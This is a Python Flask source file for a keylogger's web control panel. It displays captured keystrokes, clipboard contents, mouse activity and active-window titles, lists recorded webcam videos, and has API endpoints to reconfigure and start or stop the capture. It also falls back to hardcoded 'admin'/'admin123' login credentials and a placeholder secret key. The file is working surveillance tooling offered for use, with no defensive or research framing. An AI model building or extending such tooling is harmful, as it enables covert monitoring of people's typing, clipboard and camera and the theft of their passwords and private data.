"""Flask web application for keylogger interface."""

import os
import json
import logging
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, flash
from werkzeug.security import check_password_hash, generate_password_hash
from functools import wraps

logger = logging.getLogger(__name__)


def create_web_app(keylogger_core, config_manager):
    """Create and configure Flask web application."""
    app = Flask(__name__, 
                template_folder='../templates',
                static_folder='../static')
    
    # Configure app
    app.secret_key = config_manager.get('web.secret_key', 'dev-key-change-in-production')
    app.config['DEBUG'] = config_manager.get('web.debug', False)
    
    # Store references
    app.keylogger_core = keylogger_core
    app.config_manager = config_manager
    
    logger.info("Setting up Flask routes...")
    
    def login_required(f):
        """Decorator to require login for protected routes."""
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not session.get('logged_in'):
                return redirect(url_for('login'))
            return f(*args, **kwargs)
        return decorated_function
    
    @app.route('/login', methods=['GET', 'POST'])
    def login():
        """Login page."""
        if request.method == 'POST':
            username = request.form.get('username')
            password = request.form.get('password')
            
            # Simple authentication (in production, use proper user management)
            admin_user = config_manager.get('web.admin_username', 'admin')
            admin_pass = config_manager.get('web.admin_password', 'admin123')
            
            if username == admin_user and password == admin_pass:
                session['logged_in'] = True
                session['username'] = username
                flash('Successfully logged in!', 'success')
                return redirect(url_for('dashboard'))
            else:
                flash('Invalid credentials!', 'error')
        
        return render_template('login.html')
    
    @app.route('/logout')
    def logout():
        """Logout and clear session."""
        session.clear()
        flash('Successfully logged out!', 'info')
        return redirect(url_for('login'))
    
    @app.route('/')
    @login_required
    def dashboard():
        """Main dashboard."""
        try:
            # Session stats from core
            session_stats = keylogger_core.get_session_stats()

            # Build dashboard-friendly stats
            from datetime import timedelta
            import platform
            import sys as _sys
            try:
                import psutil  # type: ignore
                _has_psutil = True
            except Exception:
                psutil = None  # type: ignore
                _has_psutil = False

            uptime_seconds = int(session_stats.get('uptime', 0) or 0)
            if _has_psutil:
                process = psutil.Process(os.getpid())
                mem_mb = process.memory_info().rss / (1024 * 1024)
            else:
                mem_mb = 0.0

            stats = {
                'events_logged': session_stats.get('total_events', 0) or 0,
                'uptime': str(timedelta(seconds=uptime_seconds)),
                'memory_usage': f"{mem_mb:.1f} MB",
            }

            # Running status
            status = {
                'running': bool(session_stats.get('running', False))
            }

            # Features from config
            features = {
                'keyboard': config_manager.get('features.keyboard', config_manager.get('features.keyboard_logging', True)),
                'mouse': config_manager.get('features.mouse', config_manager.get('features.mouse_logging', True)),
                'clipboard': config_manager.get('features.clipboard', config_manager.get('features.clipboard_logging', False)),
                'window_tracking': config_manager.get('features.window_tracking', True),
                'camera': config_manager.get('features.camera', config_manager.get('camera.enabled', False)),
            }

            # System info
            if os.name == 'nt':
                disk_root = 'C:\\'
            else:
                disk_root = '/'
            system_info = {
                'platform': platform.platform(),
                'python_version': _sys.version.split(' ')[0],
                'cpu_usage': f"{psutil.cpu_percent()}%" if _has_psutil else 'N/A',
                'available_memory': f"{psutil.virtual_memory().available / (1024 * 1024):.0f} MB" if _has_psutil else 'N/A',
                'disk_space': f"{psutil.disk_usage(disk_root).free / (1024 * 1024 * 1024):.1f} GB" if _has_psutil else 'N/A',
            }

            # Recent events (map logs to expected fields)
            logs_data = _get_recent_logs(page=1, per_page=10, event_type='')
            recent_events = [
                {
                    'timestamp': item.get('timestamp'),
                    'type': item.get('type'),
                    'data': item.get('message', ''),
                    'window': item.get('window', ''),
                }
                for item in logs_data.get('logs', [])
            ]

            return render_template(
                'dashboard.html',
                status=status,
                stats=stats,
                features=features,
                system_info=system_info,
                recent_events=recent_events,
            )
        except Exception as e:
            logger.exception("Error loading dashboard")
            return render_template('error.html', error_title='Dashboard Error', error_message=str(e))
    
    @app.route('/logs')
    @login_required
    def logs():
        """Logs page."""
        try:
            page = request.args.get('page', 1, type=int)
            per_page = request.args.get('per_page', 50, type=int)
            event_type = request.args.get('type', '')
            window_filter = request.args.get('window', '')
            q = request.args.get('q', '')
            
            logs_data = _get_recent_logs(page, per_page, event_type, window_filter, q)
            
            return render_template('logs.html', 
                                 logs=logs_data['logs'],
                                 pagination=logs_data['pagination'])
        except Exception as e:
            logger.exception("Error loading logs")
            return render_template('error.html', error_title='Logs Error', error_message=str(e))

    @app.route('/api/logs')
    @login_required
    def api_logs():
        """API endpoint for logs data."""
        try:
            page = request.args.get('page', 1, type=int)
            per_page = request.args.get('per_page', 50, type=int)
            event_type = request.args.get('type', '')
            window_filter = request.args.get('window', '')
            q = request.args.get('q', '')
            
            return jsonify(_get_recent_logs(page, per_page, event_type, window_filter, q))
        except Exception as e:
            logger.exception("Error in logs API")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/config')
    @login_required
    def config():
        """Configuration page."""
        try:
            current_config = config_manager.get_all_config()
            return render_template('config.html', config=current_config)
        except Exception as e:
            logger.exception("Error loading config")
            return render_template('error.html', error_title='Config Error', error_message=str(e))
    
    @app.route('/api/config', methods=['GET', 'POST'])
    @login_required
    def api_config():
        """API endpoint for configuration."""
        try:
            if request.method == 'POST':
                new_config = request.get_json()
                config_manager.update_config(new_config)
                # Persist changes to disk and reload core configuration if possible
                try:
                    config_manager.save_config()
                except Exception:
                    logger.exception("Error saving updated configuration to disk")
                try:
                    app.keylogger_core.reload_config()
                except Exception:
                    logger.exception("Error reloading core configuration after update")
                return jsonify({'success': True, 'message': 'Configuration updated'})
            else:
                return jsonify(config_manager.get_all_config())
        except Exception as e:
            logger.exception("Error in config API")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/export')
    @login_required
    def export():
        """Export page."""
        return render_template('export.html')
    
    @app.route('/api/export')
    @login_required
    def api_export():
        """API endpoint for exporting logs."""
        try:
            format_type = request.args.get('format', 'json')
            date_from = request.args.get('from')
            date_to = request.args.get('to')
            
            # Export logic would go here
            return jsonify({
                'success': True,
                'message': f'Export in {format_type} format requested',
                'data': []
            })
        except Exception as e:
            logger.exception("Error in export API")
            return jsonify({'error': str(e)}), 500
    
    @app.route('/performance')
    @login_required
    def performance():
        """Performance monitoring page."""
        try:
            return render_template('performance.html')
        except Exception as e:
            logger.exception("Error loading performance")
            return render_template('error.html', error_title='Performance Error', error_message=str(e))

    @app.route('/api/performance')
    @login_required
    def api_performance():
        """API endpoint for performance data."""
        try:
            return jsonify(_get_performance_stats())
        except Exception as e:
            logger.exception("Error in performance API")
            return jsonify({'error': str(e)}), 500

    # Camera routes
    @app.route('/camera')
    @login_required
    def camera():
        """Camera monitoring page."""
        try:
            return render_template('camera.html')
        except Exception as e:
            logger.exception("Error loading camera page")
            return render_template('error.html', error_title='Camera Error', error_message=str(e))

    @app.route('/api/camera/stats')
    @login_required
    def api_camera_stats():
        """API endpoint for camera stats."""
        try:
            enabled = bool(config_manager.get('features.camera', config_manager.get('camera.enabled', False)))
            cm = getattr(keylogger_core, 'camera_monitor', None)
            if cm is not None:
                stats = cm.get_stats()
                stats['enabled'] = enabled
                return jsonify({'success': True, 'stats': stats})
            return jsonify({'success': True, 'stats': {'enabled': enabled, 'is_running': False}})
        except Exception as e:
            logger.exception("Error in camera stats API")
            return jsonify({'success': False, 'error': str(e)}), 500

    @app.route('/api/camera/videos')
    @login_required
    def api_camera_videos():
        """API endpoint for recent camera videos."""
        try:
            limit = request.args.get('limit', default=25, type=int)
            cm = getattr(keylogger_core, 'camera_monitor', None)
            if cm is not None:
                vids = cm.get_video_list(limit=limit)
                return jsonify({'success': True, 'videos': vids})
            return jsonify({'success': True, 'videos': []})
        except Exception as e:
            logger.exception("Error in camera videos API")
            return jsonify({'success': False, 'error': str(e)}), 500
    
    @app.route('/test')
    def test_route():
        """Test route to verify web app is working."""
        return jsonify({
            'status': 'ok',
            'message': 'Web application is running',
            'timestamp': datetime.now().isoformat()
        })
    
    @app.errorhandler(404)
    def not_found(error):
        """Handle 404 errors."""
        return render_template('error.html', 
                             error='Page not found',
                             error_code=404), 404
    
    @app.errorhandler(500)
    def internal_error(error):
        """Handle 500 errors."""
        return render_template('error.html', 
                             error='Internal server error',
                             error_code=500), 500
    
    def _get_recent_activity(limit: int = 10) -> List[Dict[str, Any]]:
        """Get recent activity from logging manager."""
        try:
            # Try to get from logging manager buffer first
            if hasattr(keylogger_core, 'logging_manager'):
                buffer_entries = keylogger_core.logging_manager.get_buffer_entries()
                if buffer_entries:
                    # Parse and format buffer entries
                    activities = []
                    for entry in buffer_entries[-limit:]:
                        activities.append({
                            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                            'type': 'Activity',
                            'message': entry
                        })
                    return activities
            
            # Fallback to mock data
            return [
                {
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'type': 'System',
                    'message': 'Keylogger started successfully'
                }
            ]
        except Exception as e:
            logger.exception("Error getting recent activity")
            return []
    
    def _get_recent_logs(page: int = 1, per_page: int = 50, event_type: str = '', window: str = '', q: str = '') -> Dict[str, Any]:
        """Get recent logs with pagination and filtering.
        Supports:
        - event_type: substring match on the event type field (case-insensitive)
        - window: substring match on the window/application field if available (case-insensitive)
        - q: substring match on the message/details field (case-insensitive)
        """
        try:
            et_filter = (event_type or '').strip().lower()
            win_filter = (window or '').strip().lower()
            q_filter = (q or '').strip().lower()

            def parse_entry(entry_str: str) -> Dict[str, Any]:
                # Try JSON first
                try:
                    obj = json.loads(entry_str)
                    if isinstance(obj, dict):
                        ts = obj.get('timestamp') or obj.get('time') or ''
                        et = obj.get('type') or obj.get('event_type') or 'Log'
                        msg = obj.get('message') or obj.get('data') or ''
                        win = obj.get('window') or obj.get('application') or obj.get('window_title') or ''
                        return {'timestamp': ts, 'type': et, 'message': msg, 'window': win}
                except Exception:
                    pass
                # Fallback legacy: "timestamp: event_type: message"
                parts = entry_str.split(': ', 2)
                if len(parts) >= 3:
                    return {'timestamp': parts[0], 'type': parts[1], 'message': parts[2], 'window': ''}
                return {
                    'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'type': 'Log',
                    'message': entry_str,
                    'window': ''
                }

            def apply_filters(item: Dict[str, Any]) -> bool:
                if et_filter and et_filter not in str(item.get('type', '')).lower():
                    return False
                if win_filter and win_filter not in str(item.get('window', '')).lower():
                    return False
                if q_filter and q_filter not in str(item.get('message', '')).lower():
                    return False
                return True

            def sort_key(item: Dict[str, Any]):
                # Best-effort sort by timestamp string
                return item.get('timestamp', '')

            # Try to get from logging manager buffer first
            if hasattr(keylogger_core, 'logging_manager'):
                buffer_entries = keylogger_core.logging_manager.get_buffer_entries()
                if buffer_entries:
                    logs = []
                    for entry in buffer_entries:
                        item = parse_entry(entry)
                        if apply_filters(item):
                            logs.append(item)
                    logs.sort(key=sort_key, reverse=True)
                    start_idx = (page - 1) * per_page
                    end_idx = start_idx + per_page
                    paginated_logs = logs[start_idx:end_idx]
                    return {
                        'logs': paginated_logs,
                        'pagination': {
                            'page': page,
                            'per_page': per_page,
                            'total': len(logs),
                            'pages': (len(logs) + per_page - 1) // per_page
                        }
                    }

            # Try to read from log file if buffer is empty
            try:
                log_file_path = keylogger_core.config.get('logging.file_path', 'logs/keylog.txt') if hasattr(keylogger_core, 'config') else 'logs/keylog.txt'
                if os.path.exists(log_file_path):
                    with open(log_file_path, 'r', encoding='utf-8') as f:
                        lines = f.readlines()
                    logs = []
                    for line in lines[-1000:]:  # Get last 1000 lines
                        line = line.strip()
                        if not line:
                            continue
                        item = parse_entry(line)
                        if apply_filters(item):
                            logs.append(item)
                    logs.sort(key=sort_key, reverse=True)
                    start_idx = (page - 1) * per_page
                    end_idx = start_idx + per_page
                    paginated_logs = logs[start_idx:end_idx]
                    return {
                        'logs': paginated_logs,
                        'pagination': {
                            'page': page,
                            'per_page': per_page,
                            'total': len(logs),
                            'pages': (len(logs) + per_page - 1) // per_page
                        }
                    }
            except Exception as e:
                logger.exception("Error reading log file")

            # Fallback to empty data
            return {
                'logs': [],
                'pagination': {
                    'page': page,
                    'per_page': per_page,
                    'total': 0,
                    'pages': 0
                }
            }
        except Exception as e:
            logger.exception("Error getting recent logs")
            return {
                'logs': [],
                'pagination': {
                    'page': page,
                    'per_page': per_page,
                    'total': 0,
                    'pages': 0
                }
            }
    
    def _get_performance_stats() -> Dict[str, Any]:
        """Get performance statistics."""
        try:
            stats = keylogger_core.get_session_stats()

            # Add system performance data
            import psutil

            # Determine disk root path cross-platform
            if os.name == 'nt':
                disk_root = os.environ.get('SystemDrive', 'C:') + '\\'
            else:
                disk_root = '/'

            # Load average (not available on Windows)
            try:
                if hasattr(os, 'getloadavg') and os.name != 'nt':
                    load1, load5, load15 = os.getloadavg()
                    load_avg = round(load1, 2)
                else:
                    load_avg = 0.0
            except Exception:
                load_avg = 0.0

            # Prepare keylogger metrics from logging manager if available
            buffer_size = 0
            log_file_size_mb = 0.0
            events_per_hour = 0.0
            try:
                if hasattr(keylogger_core, 'logging_manager') and keylogger_core.logging_manager:
                    lm_stats = keylogger_core.logging_manager.get_stats()
                    buffer_size = int(lm_stats.get('buffer_size', 0) or 0)
                    log_file_size_mb = float(lm_stats.get('log_file_size_mb', 0.0) or 0.0)
                    events_per_hour = float(lm_stats.get('events_per_hour', 0.0) or 0.0)
            except Exception:
                pass

            # Fallback events/hour from session uptime
            try:
                if not events_per_hour:
                    up_seconds = int(stats.get('uptime', 0) or 0)
                    up_hours = max(up_seconds / 3600.0, 0.0001)
                    total_events = int(stats.get('total_events', 0) or 0)
                    events_per_hour = total_events / up_hours if up_hours else 0.0
            except Exception:
                events_per_hour = 0.0

            # Format uptime as "Xh Ym"
            try:
                up_seconds = int(stats.get('uptime', 0) or 0)
                hours = up_seconds // 3600
                minutes = (up_seconds % 3600) // 60
                uptime_str = f"{hours}h {minutes}m"
            except Exception:
                uptime_str = "0h 0m"

            # Compute last activity for components
            def _format_last_activity(ts):
                try:
                    if not ts:
                        return 'N/A'
                    ts = float(ts)
                    delta = max(0, time.time() - ts)
                    if delta < 5:
                        return 'just now'
                    if delta < 60:
                        return f"{int(delta)}s ago"
                    if delta < 3600:
                        return f"{int(delta // 60)}m ago"
                    hours = int(delta // 3600)
                    minutes = int((delta % 3600) // 60)
                    return f"{hours}h {minutes}m ago"
                except Exception:
                    return 'N/A'

            keyboard_last = 'N/A'
            try:
                if hasattr(keylogger_core, 'keyboard_listener') and keylogger_core.keyboard_listener:
                    keyboard_last = _format_last_activity(getattr(keylogger_core.keyboard_listener, 'last_key_time', None))
            except Exception:
                keyboard_last = 'N/A'

            mouse_last = 'N/A'
            try:
                if hasattr(keylogger_core, 'mouse_listener') and keylogger_core.mouse_listener:
                    candidates = []
                    try:
                        candidates.append(getattr(keylogger_core.mouse_listener, 'last_move_time', None))
                    except Exception:
                        pass
                    try:
                        candidates.append(getattr(keylogger_core.mouse_listener, 'last_batch_time', None))
                    except Exception:
                        pass
                    candidates = [c for c in candidates if c]
                    mouse_last = _format_last_activity(max(candidates) if candidates else None)
            except Exception:
                mouse_last = 'N/A'

            clipboard_last = 'N/A'
            try:
                if hasattr(keylogger_core, 'clipboard_listener') and keylogger_core.clipboard_listener:
                    cl = keylogger_core.clipboard_listener
                    ts_candidate = None
                    try:
                        hist = getattr(cl, 'content_history', None)
                        if hist and isinstance(hist, list) and len(hist) > 0:
                            last_entry = hist[-1]
                            if isinstance(last_entry, dict):
                                ts_candidate = last_entry.get('timestamp') or last_entry.get('time')
                    except Exception:
                        pass
                    clipboard_last = _format_last_activity(ts_candidate)
            except Exception:
                clipboard_last = 'N/A'

            window_last = 'N/A'
            try:
                if hasattr(keylogger_core, 'window_monitor') and keylogger_core.window_monitor:
                    wm = keylogger_core.window_monitor
                    ts_candidate = getattr(wm, 'window_start_time', None)
                    if not ts_candidate and getattr(wm, 'current_window', None):
                        try:
                            ts_candidate = wm.current_window.get('timestamp')
                        except Exception:
                            ts_candidate = None
                    window_last = _format_last_activity(ts_candidate)
            except Exception:
                window_last = 'N/A'

            components = {
                'keyboard': {
                    'events': int(stats.get('keyboard_events', 0) or 0),
                    'last_activity': keyboard_last
                },
                'mouse': {
                    'events': int(stats.get('mouse_events', 0) or 0),
                    'last_activity': mouse_last
                },
                'clipboard': {
                    'events': int(stats.get('clipboard_events', 0) or 0),
                    'last_activity': clipboard_last
                },
                'window': {
                    'events': int(stats.get('window_events', stats.get('window_changes', 0)) or 0),
                    'last_activity': window_last
                }
            }

            return {
                'system': {
                    'cpu_percent': psutil.cpu_percent(),
                    'memory_percent': psutil.virtual_memory().percent,
                    'disk_percent': psutil.disk_usage(disk_root).percent,
                    'load_average': load_avg,
                },
                'keylogger': {
                    'uptime': uptime_str,
                    'events_per_hour': round(float(events_per_hour), 2),
                    'buffer_size': buffer_size,
                    'log_file_size_mb': round(float(log_file_size_mb), 3),
                    'events_logged': stats.get('total_events', 0),
                    'errors': stats.get('errors', 0)
                },
                'components': components
            }
        except Exception as e:
            logger.exception("Error getting performance stats")
            return {
                'system': {},
                'keylogger': {},
                'components': {}
            }
    
    @app.route('/api/start', methods=['POST'])
    @login_required
    def api_start():
        """API endpoint to start the keylogger."""
        try:
            if hasattr(keylogger_core, 'is_running') and keylogger_core.is_running():
                return jsonify({'success': True, 'message': 'Keylogger already running', 'running': True, 'stats': keylogger_core.get_session_stats()})
            started = keylogger_core.start()
            if started:
                return jsonify({'success': True, 'message': 'Keylogger started', 'running': True, 'stats': keylogger_core.get_session_stats()})
            return jsonify({'success': False, 'message': 'Failed to start keylogger'}), 500
        except Exception as e:
            logger.exception("Error starting keylogger via API")
            return jsonify({'success': False, 'error': str(e)}), 500

    @app.route('/api/stop', methods=['POST'])
    @login_required
    def api_stop():
        """API endpoint to stop the keylogger."""
        try:
            if hasattr(keylogger_core, 'is_running') and not keylogger_core.is_running():
                return jsonify({'success': True, 'message': 'Keylogger already stopped', 'running': False, 'stats': keylogger_core.get_session_stats()})
            stopped = keylogger_core.stop()
            if stopped:
                return jsonify({'success': True, 'message': 'Keylogger stopped', 'running': False, 'stats': keylogger_core.get_session_stats()})
            return jsonify({'success': False, 'message': 'Failed to stop keylogger'}), 500
        except Exception as e:
            logger.exception("Error stopping keylogger via API")
            return jsonify({'success': False, 'error': str(e)}), 500
    
    logger.info(f"Registered login route: {app.url_map}")
    logger.info(f"Web interface initialized on {config_manager.get('web.host', '127.0.0.1')}:{config_manager.get('web.port', 5000)}")
    
    return app